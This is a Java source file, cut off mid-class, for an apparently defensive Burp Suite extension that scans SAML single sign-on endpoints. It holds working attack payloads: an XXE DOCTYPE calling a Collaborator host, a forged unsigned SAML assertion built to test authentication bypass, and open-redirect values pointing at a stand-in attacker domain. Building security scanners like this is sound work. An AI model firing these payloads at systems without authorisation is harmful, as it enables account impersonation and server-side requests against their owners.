package com.ioactive.aiscanner.scan;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.collaborator.CollaboratorPayload;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.http.RequestOptions;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.params.ParsedHttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.ioactive.aiscanner.ui.ScanLog;

import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.temporal.ChronoUnit;
import java.util.Base64;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;
import java.util.function.UnaryOperator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Generic SAML SSO security probe — fully ABSTRACT, driven by PROTOCOL signals, never by a vendor name or a
 * literal path. It reconstructs the SAML surface (SP metadata, ACS, SP-initiated SSO endpoint) from the site map
 * by content-type / XML-root / SAML-parameter signals, then runs a battery of ZERO-FP, NON-DESTRUCTIVE checks:
 *
 * <ol>
 *   <li><b>Self-signed test certificate</b> — if any cert in the SP metadata is self-signed and its Subject CN
 *       matches a test-credential pattern (test, stub, sample, demo, localhost, …), the private key is likely
 *       publicly distributed with the SAML library. HIGH: enables SP impersonation, assertion decryption, and
 *       XSW without key-cracking. Generic: no library names or fingerprint lists hardcoded.</li>
 *   <li><b>Metadata hardening</b> — deterministic parse of the SP metadata XML: assertions not required signed
 *       ({@code WantAssertionsSigned="false"}/absent), assertions not encrypted (no encryption KeyDescriptor),
 *       and an HTTP-Artifact ACS binding present. Safe reads → always fine to run.</li>
 *   <li><b>ACS verbose-error exercise</b> — POST a malformed {@code SAMLResponse} and probe SignIn/Logout with
 *       a bad ReturnUrl so those responses land in Burp's site map. {@link VerboseErrorProbe} runs after and is
 *       the sole filer of "Stack trace disclosure" host-wide, backed by the richest available evidence.</li>
 *   <li><b>XXE at the ACS (out-of-band)</b> — reuse Burp Collaborator exactly as {@link SsrfProbe}/{@link XxeProbe}
 *       do: base64 a SAML-ish doc whose DOCTYPE references a fresh Collaborator host, POST it as
 *       {@code SAMLResponse}, poll for an interaction. Fire only on a CONFIRMED callback. No file exfiltration.</li>
 *   <li><b>Unsigned / forged assertion acceptance</b> — craft a minimal, well-formed but UNSIGNED
 *       {@code <Response>} with a synthetic {@code NameID}, POST it as {@code SAMLResponse}. Fire only when the SP
 *       ACCEPTS it as authentication (a non-login redirect PLUS a freshly-set session cookie), re-confirmed.</li>
 *   <li><b>RelayState / ReturnUrl open redirect</b> — if the SP-initiated endpoint carries a return/redirect
 *       param, request it with an off-domain absolute URL and a protocol-relative value; fire only on an actual
 *       off-domain 3xx {@code Location}. Reuses the existing "Open redirect" class so it dedups.</li>
 * </ol>
 *
 * <p>TODO (deliberately skipped — need a captured valid assertion / too niche for a zero-FP generic probe):
 * NameID comment-injection (XML canonicalization truncation) and HTTP-Artifact-binding SSRF via ArtifactResolve.
 */
public final class SamlProbe {

    private final MontoyaApi api;
    private final ScanLog scanLog;

    public SamlProbe(MontoyaApi api, ScanLog scanLog) {
        this.api = api;
        this.scanLog = scanLog;
    }

    // --- SAML protocol signals (all case-insensitive, no vendor/path hardcoding) ---
    private static final Pattern SAML_METADATA_CT = Pattern.compile("(?i)samlmetadata\\+xml");
    private static final Pattern ENTITY_DESCRIPTOR = Pattern.compile("(?i)<(?:[a-z0-9]+:)?EntityDescriptor[\\s>]");
    private static final Pattern SAML_REQUEST_PARAM = Pattern.compile("(?i)[?&]SAMLRequest=");
    private static final Pattern SAML_PATH_SEG = Pattern.compile("(?i)(^|[/._-])saml([0-9]{0,2})([/._-]|$)");
    // A redirect/return param the SP-initiated endpoint may echo into a Location — discovered generically.
    private static final Pattern RETURN_PARAM = Pattern.compile("(?i)^(RelayState|ReturnUrl|returnUrl|redirect|redirectUri|redirect_uri|returnTo|return_to|next|url)$");

    // Generic signals that a cert is a library-shipped test credential — no fingerprint hardcoding.
    // Self-signed (issuer == subject) is the necessary condition; the CN pattern adds specificity.
    // "Tests", "Sample", "Demo", "Stub", "localhost", "example" are canonical test-cert CN patterns.
    private static final Pattern TEST_CERT_CN = Pattern.compile(
        "(?i)\\b(test|tests|stub|sample|demo|localhost|example\\.org|example\\.com|dummy|placeholder|selfsigned|dev[._-]?cert)\\b");

    private static long SEQ = 0L;
    private static synchronized long seq() { return ++SEQ; }

    /** Verdict of the active unsigned-assertion test: the SP ACCEPTED the forgery (auth bypass), actively REJECTED
     *  it (response-level signing enforced → the metadata note is only defense-in-depth), or we could not reach the
     *  ACS to test (UNTESTED → fall back to the metadata-only note without asserting exploitability). */
    private enum Unsigned { ACCEPTED, REJECTED, UNTESTED }

    /** Run once per host: discover the SAML surface from the site map and probe it. Returns the finding count. */
    public int probe(String host, UnaryOperator<HttpRequest> withSession) {
        Surface s = discover(host);
        if (s.isEmpty()) {
            scanLog.log("[AI Scanner] SAML probe: no SAML surface found (no metadata / SAMLRequest / SAMLResponse / saml path in scope).");
            return 0;
        }
        scanLog.log("[AI Scanner] SAML probe: surface — metadata=" + yn(s.metadataRr != null)
                + " ACS=" + (s.acsUrl != null ? s.acsUrl : "(none)")
                + " SP-init=" + (s.ssoUrl != null ? s.ssoUrl : "(none)")
                + " SLO=" + (s.logoutUrl != null ? s.logoutUrl : "(none)")
                + " entityID=" + (s.entityId != null ? s.entityId : "(unknown)"));

        int hits = 0;
        // 0) Self-signed test/library certificate — root-cause HIGH finding; gates or contextualises the rest.
        try { if (s.metadataRr != null && checkPublicTestCert(s)) hits++; }
        catch (Throwable t) { scanLog.debug("[AI Scanner]   saml public-test-cert check error: " + t); }
        // 1) unsigned/forged assertion acceptance (auth bypass) — the AUTHORITATIVE test of whether the SP actually
        //    trusts an unsigned assertion. Run it FIRST so its verdict can gate the metadata WantAssertionsSigned
        //    claim below (avoid the classic FP: metadata says signing not required, but the SP still enforces
        //    response-level signing and rejects the forgery).
        Unsigned unsigned = Unsigned.UNTESTED;
        try { if (s.acsUrl != null) unsigned = checkUnsignedAssertion(s, withSession); } catch (Throwable t) { scanLog.debug("[AI Scanner]   saml unsigned-assertion check error: " + t); }
        if (unsigned == Unsigned.ACCEPTED) hits++;
        // 2) metadata hardening — deterministic reads of the fetched metadata; the assertion-signing note is gated
        //    on the active verdict from (1) so we never overclaim forgeability the SP actually rejects.
        hits += metadataChecks(s, unsigned);
        // 3) verbose-error / stack-trace disclosure across the SAML command surface (ACS + SignIn/Logout).
        // SamlProbe exercises these endpoints so the responses land in the site map; VerboseErrorProbe runs
        // AFTER and is the sole filer of "Stack trace disclosure" host-wide (via passive scan of those hits).
        // SamlProbe only logs the observation here — no independent filing — to avoid racing with VerboseErrorProbe
        // for the firstForHost slot and producing a finding backed by the weaker SAML evidence instead of the
        // richer REST evidence (DB schema / source paths) that VerboseErrorProbe surfaces.
        try { samlStackTraceExercise(s, withSession); } catch (Throwable t) { scanLog.debug("[AI Scanner]   saml stack-trace exercise error: " + t); }
        // 4) XXE at the ACS, out-of-band via Burp Collaborator (same mechanism as SsrfProbe/XxeProbe).
        try { if (s.acsUrl != null && acsXxeOob(s, withSession)) hits++; } catch (Throwable t) { scanLog.debug("[AI Scanner]   saml xxe check error: " + t); }
        // 5) RelayState/ReturnUrl open redirect on the SP-initiated endpoint (reuses the "Open redirect" class).
        try { if (s.ssoUrl != null && relayStateOpenRedirect(s, withSession)) hits++; } catch (Throwable t) { scanLog.debug("[AI Scanner]   saml open-redirect check error: " + t); }
        return hits;
    }

    // ------------------------------------------------------------------ discovery

    /** Reconstructed SAML surface for a host. */
    private static final class Surface {
        HttpRequestResponse metadataRr;    // the SP metadata response (evidence for the hardening findings)
        String metadataXml;                // its body
        String acsUrl;                     // Assertion Consumer Service (POST target for SAMLResponse)
        String acsBinding;                 // the ACS binding URN (if metadata gave one)
        String ssoUrl;                     // SP-initiated SSO endpoint (carries/echoes a return param)
        String ssoReturnParam;             // the discovered return/redirect param name on ssoUrl, or null
        String entityId;                   // the SP entityID (from metadata), or null
        boolean wantAssertionsSigned;      // parsed from metadata
        boolean sawWantAssertionsSigned;   // was the attribute present at all
        boolean encryptionKey;             // a KeyDescriptor use="encryption" present
        boolean artifactBinding;           // an ACS with HTTP-Artifact binding present
        boolean relayStateSeen;            // the app used a RelayState in an observed SSO request
        boolean authnRequestsSigned;       // parsed from metadata: SP signs outbound AuthnRequests
        String logoutUrl;                  // Sustainsys SLO endpoint (derived) — checked for stack-trace disclosure
        boolean isEmpty() { return metadataRr == null && acsUrl == null && ssoUrl == null; }
        String metadataUrl() { return metadataRr != null && metadataRr.request() != null ? metadataRr.request().url() : (acsUrl != null ? acsUrl : ssoUrl); }
    }

    private Surface discover(String host) {
        Surface s = new Surface();
        Set<String> samlPaths = new LinkedHashSet<>();
        try {
            for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
                if (rr == null || rr.request() == null) continue;
                String url = rr.request().url();
                if (!inScope(host, url)) continue;

                // (a) metadata endpoint: content-type samlmetadata+xml OR an <EntityDescriptor> body.
                if (s.metadataRr == null && rr.response() != null) {
                    String ct = rr.response().hasHeader("Content-Type") ? rr.response().headerValue("Content-Type") : "";
                    String body = safeBody(rr);
                    if ((ct != null && SAML_METADATA_CT.matcher(ct).find())
                            || (body != null && ENTITY_DESCRIPTOR.matcher(body).find())) {
                        s.metadataRr = AiScanner.decompress(rr);
                        s.metadataXml = safeBody(s.metadataRr);
                    }
                }

                // (b) SP-initiated SSO: a 3xx Location or a link/param carrying SAMLRequest=.
                if (s.ssoUrl == null) {
                    String loc = rr.response() != null && rr.response().hasHeader("Location") ? rr.response().headerValue("Location") : null;
                    if ((loc != null && SAML_REQUEST_PARAM.matcher(loc).find())
                            || SAML_REQUEST_PARAM.matcher(url).find()) {
                        // The SP endpoint is the request URL that produced the SAMLRequest (that's what we can re-drive).
                        s.ssoUrl = Net.stripQuery(url);
                        String rp = findReturnParam(rr.request(), loc);
                        if (rp != null) s.ssoReturnParam = rp;
                    }
                }

                // (c) ACS: a request/form carrying a SAMLResponse parameter → its action URL IS the ACS.
                for (ParsedHttpParameter p : rr.request().parameters()) {
                    if ("SAMLResponse".equalsIgnoreCase(p.name())) {
                        if (s.acsUrl == null) s.acsUrl = Net.stripQuery(url);
                    }
                    if ("RelayState".equalsIgnoreCase(p.name())) s.relayStateSeen = true;
                }
                // A rendered login form whose <form action=…> posts SAMLResponse (the browser would POST it there).
                String body = safeBody(rr);
                if (body != null && body.toLowerCase().contains("samlresponse")) {
                    String action = formActionFor(body, url);
                    if (action != null && s.acsUrl == null) s.acsUrl = action;
                }

                // (d) any in-scope URL whose PATH contains a `saml` segment → candidate endpoint; classify below.
                if (SAML_PATH_SEG.matcher(pathOf(url)).find()) samlPaths.add(Net.stripQuery(url));
            }
        } catch (Throwable t) { scanLog.debug("[AI Scanner]   saml discovery error: " + t); }

        // Classify remaining `saml`-path candidates by FETCHING them (generic, no path hardcoding): a metadata
        // body fills the metadata slot; a SAMLRequest redirect fills the SP-init slot. This recovers the surface
        // when the crawler saw the endpoint but not (yet) a SAML message flowing through it.
        for (String cand : samlPaths) {
            if (s.metadataRr != null && s.ssoUrl != null) break;
            try {
                HttpRequestResponse rr = AiScanner.decompress(send(HttpRequest.httpRequestFromUrl(cand).withMethod("GET")));
                if (rr == null || rr.response() == null) continue;
                String ct = rr.response().hasHeader("Content-Type") ? rr.response().headerValue("Content-Type") : "";
                String body = safeBody(rr);
                if (s.metadataRr == null && ((ct != null && SAML_METADATA_CT.matcher(ct).find())
                        || (body != null && ENTITY_DESCRIPTOR.matcher(body).find()))) {
                    s.metadataRr = rr; s.metadataXml = body;
                }
                String loc = rr.response().hasHeader("Location") ? rr.response().headerValue("Location") : null;
                if (s.ssoUrl == null && loc != null && SAML_REQUEST_PARAM.matcher(loc).find()) {
                    s.ssoUrl = cand;
                    String rp = findReturnParam(rr.request(), loc);
                    if (rp != null) s.ssoReturnParam = rp;
                }
            } catch (Throwable ignore) { }
        }

        // Parse whatever metadata we have; if it yields an ACS Location, prefer it (authoritative).
        if (s.metadataXml != null) parseMetadata(s);
        // Sustainsys.Saml2 exposes fixed command routes under its module base; derive + confirm them so the
        // open-redirect and stack-trace checks aren't blind to routes the crawler never entered.
        deriveSustainsysRoutes(s);
        return s;
    }

    /** Sustainsys.Saml2 serves fixed command endpoints under its module base — {@code <base>/Acs}, {@code <base>/SignIn},
     *  {@code <base>/Logout} (framework route constants, NOT app-specific paths). Derive the base from the ACS parent
     *  or the entityID, then actively CONFIRM SignIn is a real SP-initiated endpoint (a 3xx carrying a SAMLRequest to
     *  the IdP) before wiring it up. This recovers the SP-init + SLO surface even when the crawl only saw the metadata
     *  endpoint, so the open-redirect and (module-wide) stack-trace checks actually run. Generic to any Sustainsys SP. */
    private void deriveSustainsysRoutes(Surface s) {
        String base = null;
        if (s.acsUrl != null) {                                   // …/Acs → strip the trailing command segment
            int i = s.acsUrl.lastIndexOf('/');
            if (i > 9) base = s.acsUrl.substring(0, i);
        }
        if (base == null && s.entityId != null && s.entityId.regionMatches(true, 0, "http", 0, 4)) {
            base = s.entityId.endsWith("/") ? s.entityId.substring(0, s.entityId.length() - 1) : s.entityId;
        }
        if (base == null || !base.contains("://")) return;
        if (s.ssoUrl == null) {
            try {
                HttpRequestResponse rr = send(HttpRequest.httpRequestFromUrl(base + "/SignIn").withMethod("GET"));
                String loc = rr != null && rr.response() != null && rr.response().hasHeader("Location")
                        ? rr.response().headerValue("Location") : null;
                if (loc != null && SAML_REQUEST_PARAM.matcher(loc).find()) {   // confirmed: redirects to the IdP
                    s.ssoUrl = base + "/SignIn";
                    if (s.ssoReturnParam == null) s.ssoReturnParam = "ReturnUrl";   // Sustainsys return-param name
                }
            } catch (Throwable ignore) { }
        }
        if (s.logoutUrl == null) s.logoutUrl = base + "/Logout";
    }

    // ------------------------------------------------------------------ 1) metadata hardening

    /** From the metadata XML extract ACS Location(s)+Binding(s), WantAssertionsSigned, AuthnRequestsSigned,
     *  encryption KeyDescriptor, and entityID (plain string/regex parse, mirroring the HTML-parsing probes). */
    private void parseMetadata(Surface s) {
        String xml = s.metadataXml;
        // entityID
        Matcher e = Pattern.compile("(?i)\\bentityID\\s*=\\s*\"([^\"]+)\"").matcher(xml);
        if (e.find()) s.entityId = e.group(1);
        // WantAssertionsSigned (default is false when absent — so absence is the weak case too).
        Matcher w = Pattern.compile("(?i)\\bWantAssertionsSigned\\s*=\\s*\"([^\"]*)\"").matcher(xml);
        if (w.find()) { s.sawWantAssertionsSigned = true; s.wantAssertionsSigned = "true".equalsIgnoreCase(w.group(1).trim()); }
        // AuthnRequestsSigned — true means the SP signs outbound AuthnRequests with its private key.
        Matcher ars = Pattern.compile("(?i)\\bAuthnRequestsSigned\\s*=\\s*\"([^\"]*)\"").matcher(xml);
        if (ars.find()) s.authnRequestsSigned = "true".equalsIgnoreCase(ars.group(1).trim());
        // encryption KeyDescriptor
        s.encryptionKey = Pattern.compile("(?i)<(?:[a-z0-9]+:)?KeyDescriptor\\b[^>]*\\buse\\s*=\\s*\"encryption\"").matcher(xml).find();
        // AssertionConsumerService Location + Binding — take the first non-artifact by default; note artifact.
        Matcher acs = Pattern.compile("(?i)<(?:[a-z0-9]+:)?AssertionConsumerService\\b[^>]*>").matcher(xml);
        String firstLoc = null, firstBind = null;
        while (acs.find()) {
            String tag = acs.group();
            String loc = attr(tag, "Location");
            String bind = attr(tag, "Binding");
            if (bind != null && bind.toLowerCase().contains("artifact")) { s.artifactBinding = true; continue; }
            if (firstLoc == null && loc != null) { firstLoc = loc; firstBind = bind; }
        }
        if (firstLoc != null) { s.acsUrl = firstLoc; s.acsBinding = firstBind; }   // metadata ACS is authoritative
    }

    /** Deterministic metadata-hardening findings (safe reads — always fine to run). The assertion-signing note is
     *  gated on {@code unsigned}, the verdict of the active unsigned-assertion test, to avoid the classic FP of
     *  claiming forgeability that the SP actually rejects via response-level signing. */
    private int metadataChecks(Surface s, Unsigned unsigned) {
        if (s.metadataRr == null) return 0;
        int hits = 0;
        String attr = s.sawWantAssertionsSigned ? "sets WantAssertionsSigned=\"false\""
                : "omits WantAssertionsSigned (defaults to false)";
        // Assertions not required to be signed (attribute "false" OR absent). What we RAISE depends on the active test:
        //   ACCEPTED  → the HIGH auth-bypass already fired and proves impact; this metadata note would be redundant.
        //   REJECTED  → the SP was observed to reject a fully-unsigned Response (response-level signing enforced), so
        //               forgery is NOT accepted here → downgrade to a LOW defense-in-depth note, no impersonation claim.
        //   UNTESTED  → ACS unreachable for the active test → keep the metadata note but mark it not-actively-confirmed.
        if (!s.wantAssertionsSigned && unsigned != Unsigned.ACCEPTED) {
            if (unsigned == Unsigned.REJECTED) {
                scanLog.found("SAML metadata does not require assertion signing (response signing enforced)", s.metadataUrl(),
                        "The SP metadata " + attr + ", i.e. assertion-level signing is not demanded. However, the ACS "
                        + "was actively observed to REJECT a fully-unsigned SAML Response, so response-level signing IS "
                        + "enforced and a forged/unsigned assertion is NOT accepted here. Defense-in-depth only: also "
                        + "require signed assertions so the subject and attribute statements are individually protected.",
                        true, s.metadataRr);
            } else {
                scanLog.found("SAML weak assertion signing (assertions not required to be signed)", s.metadataUrl(),
                        "The SP metadata " + attr + " — the SP does not require inbound SAML assertions to be signed, so "
                        + "a forged/tampered assertion MAY be accepted (not actively confirmed: the ACS was not reachable "
                        + "for the active unsigned-assertion test). Combine with signature-validation flaws to impersonate a user.",
                        true, s.metadataRr);
            }
            scanLog.incFinding();
            hits++;
        }
        // Assertions not encrypted (no encryption KeyDescriptor) — assertions travel in cleartext through the browser.
        if (!s.encryptionKey) {
            scanLog.found("SAML assertions not encrypted", s.metadataUrl(),
                    "The SP metadata declares no KeyDescriptor with use=\"encryption\", so the IdP sends assertions "
                    + "unencrypted; the NameID and attribute statements (identity/PII) pass through the user's "
                    + "browser and any intermediary in cleartext.",
                    true, s.metadataRr);
            scanLog.incFinding();
            hits++;
        }
        // HTTP-Artifact ACS binding present — extra back-channel surface worth noting.
        if (s.artifactBinding) {
            scanLog.found("SAML HTTP-Artifact binding enabled", s.metadataUrl(),
                    "The SP metadata advertises an AssertionConsumerService with the HTTP-Artifact binding. The "
                    + "artifact-resolution back-channel is additional attack surface (SSRF via ArtifactResolve, "
                    + "artifact-reuse) that should be reviewed if the SP does not need it.",
                    true, s.metadataRr);
            scanLog.incFinding();
            hits++;
        }
        return hits;
    }

    // ------------------------------------------------------------------ 2) ACS verbose error / stack trace (exercise only)

    /** Exercises the SAML command surface with SAML-specific malformed inputs so that the error responses land in
     *  Burp's site map. VerboseErrorProbe, which runs AFTER SamlProbe, picks them up via passive scan and is the
     *  SOLE filer of "Stack trace disclosure" host-wide — that way the finding is always backed by the richest
     *  available evidence (e.g. a REST endpoint leaking DB schema) rather than a SAML-only trace. */
    private void samlStackTraceExercise(Surface s, UnaryOperator<HttpRequest> withSession) {
        String evil = "https://aiscan-saml-oob.example.org/";
        java.util.List<String> urls = new java.util.ArrayList<>();
        java.util.List<HttpRequest> reqs = new java.util.ArrayList<>();
        if (s.acsUrl != null) {
            urls.add(s.acsUrl);
            reqs.add(buildAcsPost(s.acsUrl, "notvalidbase64", s.relayStateSeen ? "aiscan" : null));
        }
        if (s.ssoUrl != null) {
            urls.add(s.ssoUrl);
            reqs.add(HttpRequest.httpRequestFromUrl(s.ssoUrl).withMethod("GET").withAddedParameters(HttpParameter.urlParameter("ReturnUrl", evil)));
        }
        if (s.logoutUrl != null) {
            urls.add(s.logoutUrl);
            reqs.add(HttpRequest.httpRequestFromUrl(s.logoutUrl).withMethod("GET").withAddedParameters(HttpParameter.urlParameter("ReturnUrl", evil)));
        }
        for (int i = 0; i < reqs.size(); i++) {
            HttpRequest req = reqs.get(i);
            HttpRequestResponse rr = send(withSession != null ? withSession.apply(req) : req);
            if (StackTraceOracle.hasStackTrace(rr))
                scanLog.debug("[AI Scanner]   saml stack-trace observed @ " + urls.get(i)
                        + " — VerboseErrorProbe will file the host-wide finding.");
        }
    }

    // ------------------------------------------------------------------ 3) XXE at the ACS (OOB / Collaborator)

    /** Reuse Burp Collaborator (same as SsrfProbe/XxeProbe): a SAML-ish doc whose DOCTYPE references a fresh
     *  Collaborator host, base64'd and POSTed as SAMLResponse; a landed interaction proves server-side external-
     *  entity resolution. Non-destructive: a plain OOB http:// entity, NO file exfiltration. */
    private boolean acsXxeOob(Surface s, UnaryOperator<HttpRequest> withSession) {
        CollaboratorClient collab;
        try { collab = api.collaborator().createClient(); }
        catch (Throwable t) { scanLog.debug("[AI Scanner]   saml xxe: Collaborator unavailable — OOB XXE skipped"); return false; }

        String tag = "sxxe" + seq();
        CollaboratorPayload cp;
        try { cp = collab.generatePayload(tag); } catch (Throwable t) { return false; }
        String domain = cp.toString();
        // A SAML-ish envelope with an external-entity DOCTYPE pointing at the Collaborator host (http:// only).
        String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                + "<!DOCTYPE samlp:Response [<!ENTITY xxe SYSTEM \"http://" + domain + "/x\">]>"
                + "<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" "
                + "xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\">"
                + "<saml:Issuer>&xxe;</saml:Issuer></samlp:Response>";
        String b64 = Base64.getEncoder().encodeToString(xml.getBytes(StandardCharsets.UTF_8));
        HttpRequestResponse inj = postSamlResponse(s.acsUrl, b64, s.relayStateSeen ? "aiscan" : null, withSession);

        // Poll for a callback (same cadence as SsrfProbe/XxeProbe: ~15s).
        try {
            for (int round = 0; round < 6; round++) {
                Thread.sleep(2500);
                List<Interaction> interactions;
                try { interactions = collab.getAllInteractions(); } catch (Throwable t) { break; }
                if (interactions == null || interactions.isEmpty()) continue;
                for (Interaction it : interactions) {
                    if (!tag.equals(it.customData().orElse(null))) continue;
                    scanLog.found("XML external entity (XXE) injection", s.acsUrl,
                            "The Assertion Consumer Service's XML parser resolved an attacker-controlled external "
                            + "entity from a base64'd SAMLResponse: a " + it.type() + " interaction hit Burp "
                            + "Collaborator from the server (CWE-611). Server-side external-entity resolution enables "
                            + "SSRF / file read. Proven out-of-band; attached: the SAMLResponse POST that caused it.",
                            true, inj);
                    scanLog.incFinding();
                    return true;
                }
            }
        } catch (InterruptedException ie) { Thread.currentThread().interrupt(); }
        catch (Throwable t) { scanLog.debug("[AI Scanner]   saml xxe poll error: " + t); }
        return false;
    }

    // ------------------------------------------------------------------ 4) unsigned / forged assertion acceptance

    /** Craft a MINIMAL well-formed but UNSIGNED SAML Response with a synthetic NameID, POST as SAMLResponse, and
     *  classify the SP's response: ACCEPTED (non-login 3xx + fresh session cookie, re-confirmed → raises the HIGH
     *  auth-bypass), REJECTED (a real response that did NOT authenticate us → response-level signing enforced), or
     *  UNTESTED (no response — ACS unreachable). The verdict gates the metadata WantAssertionsSigned note. */
    private Unsigned checkUnsignedAssertion(Surface s, UnaryOperator<HttpRequest> withSession) {
        String b64 = buildUnsignedResponse(s.acsUrl, s.entityId);
        HttpRequestResponse rr = postSamlResponseNoSession(s.acsUrl, b64, s.relayStateSeen ? "aiscan" : null);
        if (rr == null || rr.response() == null) return Unsigned.UNTESTED;   // couldn't reach the ACS at all
        if (!acceptedAsAuth(rr, s.acsUrl)) return Unsigned.REJECTED;          // got a real response; it did NOT log us in
        HttpRequestResponse rr2 = postSamlResponseNoSession(s.acsUrl, buildUnsignedResponse(s.acsUrl, s.entityId), s.relayStateSeen ? "aiscan" : null);
        if (!acceptedAsAuth(rr2, s.acsUrl)) return Unsigned.REJECTED;         // re-confirm (zero-FP) — flaky pass → treat as rejected
        scanLog.found("SAML authentication bypass (unsigned/forged assertion accepted)", s.acsUrl,
                "The Assertion Consumer Service ACCEPTED an UNSIGNED, attacker-crafted SAML assertion "
                + "(NameID aiscan-saml-probe@example.com) as a valid login: it responded with a non-login redirect "
                + "AND set a fresh session cookie, i.e. it authenticated us without any IdP signature. An attacker "
                + "can forge an assertion for ANY user and impersonate them (CWE-347 / broken authentication). Re-confirmed.",
                true, rr);
        scanLog.incFinding();
        return Unsigned.ACCEPTED;
    }

    /** Build a minimal, well-formed, UNSIGNED SAML Response (base64) whose Recipient/Audience is the ACS URL. */
    private static String buildUnsignedResponse(String acsUrl, String entityId) {
        String id = "_aisc" + Long.toHexString(seq()) + Long.toHexString(System.nanoTime());
        String aid = "_aiscA" + Long.toHexString(seq()) + Long.toHexString(System.nanoTime());
        String now = Instant.now().toString();
        String notAfter = Instant.now().plus(5, ChronoUnit.MINUTES).toString();
        String issuer = entityId != null && !entityId.isBlank() ? entityId : "https://idp.example.com/metadata";
        String nameId = "aiscan-saml-probe@example.com";
        String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                + "<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" "
                + "xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"" + id + "\" Version=\"2.0\" "
                + "IssueInstant=\"" + now + "\" Destination=\"" + xmlEsc(acsUrl) + "\">"
                + "<saml:Issuer>" + xmlEsc(issuer) + "</saml:Issuer>"
                + "<samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status>"
                + "<saml:Assertion ID=\"" + aid + "\" Version=\"2.0\" IssueInstant=\"" + now + "\">"
                + "<saml:Issuer>" + xmlEsc(issuer) + "</saml:Issuer>"
                + "<saml:Subject>"
                + "<saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\">" + nameId + "</saml:NameID>"
                + "<saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\">"
                + "<saml:SubjectConfirmationData NotOnOrAfter=\"" + notAfter + "\" Recipient=\"" + xmlEsc(acsUrl) + "\"/>"
                + "</saml:SubjectConfirmation></saml:Subject>"
                + "<saml:Conditions NotBefore=\"" + now + "\" NotOnOrAfter=\"" + notAfter + "\">"
                + "<saml:AudienceRestriction><saml:Audience>" + xmlEsc(issuer) + "</saml:Audience></saml:AudienceRestriction>"
                + "</saml:Conditions>"
                + "<saml:AuthnStatement AuthnInstant=\"" + now + "\">"
                + "<saml:AuthnContext><saml:AuthnContextClassRef>"
                + "urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport"
                + "</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement>"
                + "</saml:Assertion></samlp:Response>";
        return Base64.getEncoder().encodeToString(xml.getBytes(StandardCharsets.UTF_8));
    }

    /** Accepted-as-auth = a 3xx to an in-app (NON login/error) location AND a fresh session cookie set — NOT a
     *  bounce back to login and NOT a stack trace. Zero-FP: both signals required. */
    private boolean acceptedAsAuth(HttpRequestResponse rr, String acsUrl) {
        if (rr == null || rr.response() == null) return false;
        if (StackTraceOracle.hasStackTrace(rr)) return false;       // an error page is the SECURE outcome, not a pass
        int st = rr.response().statusCode();
        if (st < 300 || st >= 400) return false;                    // must be a redirect (post-authn landing)
        String loc = rr.response().hasHeader("Location") ? rr.response().headerValue("Location") : null;
        if (loc == null || loc.isBlank()) return false;
        // The redirect must NOT go back to a login/sign-in/error/SSO page (that is the correct rejection path).
        String ll = loc.toLowerCase();
        if (ll.matches("(?i).*(login|signin|sign-in|logon|sso|error|denied|unauthor|forbidden|fail).*")) return false;
        // A fresh session cookie must be set — the actual "you are now authenticated" signal.
        boolean setCookie = rr.response().headers().stream().anyMatch(h -> "Set-Cookie".equalsIgnoreCase(h.name()) && looksLikeSession(h.value()));
        return setCookie;
    }

    private static boolean looksLikeSession(String setCookie) {
        if (setCookie == null) return false;
        String c = setCookie.toLowerCase();
        // A non-empty cookie value that isn't an obvious deletion — generic (no app-specific cookie names).
        int eq = c.indexOf('='); if (eq < 0) return false;
        int semi = c.indexOf(';'); String val = c.substring(eq + 1, semi < 0 ? c.length() : semi).trim();
        if (val.isEmpty() || "deleted".equals(val)) return false;
        return c.contains("sess") || c.contains("auth") || c.contains("token") || c.contains("id")
                || c.contains(".aspxauth") || c.contains("jsessionid") || val.length() >= 16;
    }

    // ------------------------------------------------------------------ 5) RelayState / ReturnUrl open redirect

    /** If the SP-initiated endpoint carries a return/redirect param, request it with an off-domain absolute URL
     *  AND a protocol-relative //host; fire ONLY on a 3xx whose Location host is the attacker domain. */
    private boolean relayStateOpenRedirect(Surface s, UnaryOperator<HttpRequest> withSession) {
        String param = s.ssoReturnParam;
        if (param == null) return false;
        String evilHost = "aiscan-saml-oob.example.org";
        String[] payloads = { "https://" + evilHost + "/", "//" + evilHost + "/" };
        for (String pl : payloads) {
            HttpRequest req = HttpRequest.httpRequestFromUrl(s.ssoUrl).withMethod("GET")
                    .withAddedParameters(HttpParameter.urlParameter(param, pl));
            HttpRequestResponse rr = send(withSession != null ? withSession.apply(req) : req);
            if (rr == null || rr.response() == null) continue;
            int st = rr.response().statusCode();
            if (st < 300 || st >= 400) continue;
            String loc = rr.response().hasHeader("Location") ? rr.response().headerValue("Location") : null;
            if (loc == null) continue;
            if (evilHost.equalsIgnoreCase(redirectHost(loc, s.ssoUrl))) {
                scanLog.found("Open redirect", s.ssoUrl,
                        param + " (SAML SP-initiated return param) — the endpoint issues a 3xx to an attacker-"
                        + "controlled host (" + loc + "). Useful for phishing and for stealing SAML/OAuth artifacts "
                        + "that ride on the return URL.",
                        rr);
                scanLog.incFinding();
                return true;
            }
        }
        return false;
    }

    // ------------------------------------------------------------------ HTTP helpers

    /** POST SAMLResponse (+ optional RelayState) as application/x-www-form-urlencoded, carrying the session. */
